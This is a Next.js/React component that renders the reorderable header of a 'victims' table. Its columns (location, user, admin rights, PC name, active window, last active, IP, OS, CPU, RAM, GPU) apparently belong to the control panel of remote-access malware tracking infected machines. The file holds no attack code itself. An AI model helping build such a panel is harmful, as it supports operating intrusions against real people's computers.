import Image from "next/image";
import { useMemo, useRef } from "react";

import { cn } from "../../../../lib/utils";

import { victimsColumnSizeClass, type VictimsColumnKey } from "./victims-columns";
import { useVictimsTableColumnReorder } from "./use-victims-table-column-reorder";
import { useVictimsTablePrefs } from "./victims-table-prefs-provider";

type HeaderMeta = {
  label?: string;
  withIcon?: boolean;
  iconOnly?: boolean;
};

function headerMeta(col: VictimsColumnKey): HeaderMeta {
  switch (col) {
    case "h-country":
      return { label: "loc" };
    case "h-icon":
      return { withIcon: true, iconOnly: true };
    case "h-user":
      return { label: "user", withIcon: true };
    case "h-admin":
      return { label: "admin" };
    case "h-pc-name":
      return { label: "pc-name", withIcon: true };
    case "h-window":
      return { label: "window", withIcon: true };
    case "h-last-active":
      return { label: "last active", withIcon: true };
    case "h-id":
      return { label: "id" };
    case "h-ip":
      return { label: "ip", withIcon: true };
    case "h-os":
      return { label: "os", withIcon: true };
    case "h-cpu":
      return { label: "cpu", withIcon: true };
    case "h-ram":
      return { label: "ram", withIcon: true };
    case "h-gpu":
      return { label: "gpu", withIcon: true };
    case "h-comment":
      return { label: "comment", withIcon: true };
    default:
      return {};
  }
}

function HeaderCell(props: {
  col: VictimsColumnKey;
  label?: string;
  withIcon?: boolean;
  iconOnly?: boolean;
}) {
  const { col, label, withIcon, iconOnly } = props;

  return (
    <th
      className={cn(
        "sticky top-0 z-[2] bg-[#202020] px-[4px] pb-[3px] pt-0 text-left text-[20px] font-normal leading-[1.05] text-white/[0.98]",
        "select-none",
        col,
        victimsColumnSizeClass(col),
      )}
      style={{ borderBottom: "3px solid var(--line)" }}
    >
      {col === "h-admin" || col === "h-id" ? (
        label
      ) : (
        <span className="thLabel inline-flex items-center gap-[6px]">
          <span className="thSep mr-[6px] opacity-65">|</span>
          {withIcon && (
            <Image
              className="thIcon h-[14px] w-[14px] opacity-90 [filter:brightness(0)_invert(1)]"
              src="/icons/listtop.svg"
              alt=""
              width={14}
              height={14}
              draggable={false}
            />
          )}
          {!iconOnly && <span>{label}</span>}
        </span>
      )}
    </th>
  );
}

export function VictimsTableHeader() {
  const prefs = useVictimsTablePrefs();
  const rowRef = useRef<HTMLTableRowElement | null>(null);

  useVictimsTableColumnReorder({
    headerRow: rowRef.current,
    columnOrder: prefs.columnOrder,
    setColumnOrder: prefs.setColumnOrder,
  });

  const cols = useMemo(() => prefs.columnOrder, [prefs.columnOrder]);

  return (
    <thead>
      <tr ref={rowRef}>
        {cols.map((col) => {
          const meta = headerMeta(col);
          return <HeaderCell key={col} col={col} label={meta.label} withIcon={meta.withIcon} iconOnly={meta.iconOnly} />;
        })}
      </tr>
    </thead>
  );
}
